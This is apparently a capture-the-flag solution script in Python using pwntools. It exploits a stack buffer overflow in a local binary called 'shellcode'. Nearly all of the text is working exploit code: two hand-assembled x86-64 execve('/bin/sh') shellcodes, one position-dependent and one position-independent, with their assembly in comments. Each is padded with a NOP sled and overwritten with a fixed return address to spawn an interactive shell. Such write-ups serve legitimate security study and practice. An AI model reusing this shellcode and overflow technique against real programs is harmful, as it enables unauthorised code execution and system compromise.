# SHELLCODE

```python

#!/usr/bin/python
from pwn import *

#The challenge consinsts in a simple buffer overflow eploit, it was done both with a position dependent shellcode and a position independent shellcode.

context.terminal = ['tmux', 'splitw', '-h']

r = process("./shellcode")
gdb.attach(r, """
	c
 	""")

input("wait")
print(r.recvuntil("name?\n"))

# Address of the start of the buffer
buffer = 0x601080

#First version with a position dependent shellcode

#Shellcode
# mov rax, 0x3b
# mov rdi, 0x601148
# mov rsi, 0x601150
# mov rdx, 0x601150
# syscall

shellcode = b"\xcc\x48\xC7\xC0\x3B\x00\x00\x00\x48\xC7\xC7\x48\x11\x60\x00\x48\xC7\xC6\x50\x11\x60\x00\x48\xC7\xC2\x50\x11\x60\x00\x0F\x05"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
#fill the buffer with nops and put the address of the shellcode
shellcode = shellcode.ljust(1016, b"\x90") + p64(buffer)

#Second version with a position independent shellcode

#Shellcode
# jmp endshellcode
# shellcode:
# pop rdi
# mov rsi, rdi
# add rsi, 8
# mov rdx, rsi
# mov rax, 0x3b
# syscall

# endshellcode:
# call shellcode
# nop

shellcode = b"\xcc\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8
#fill the buffer with nops and put the address of the shellcode
payload = shellcode.ljust(1016, b"\x90") + p64(buffer)

r.send(payload)

r.interactive()
```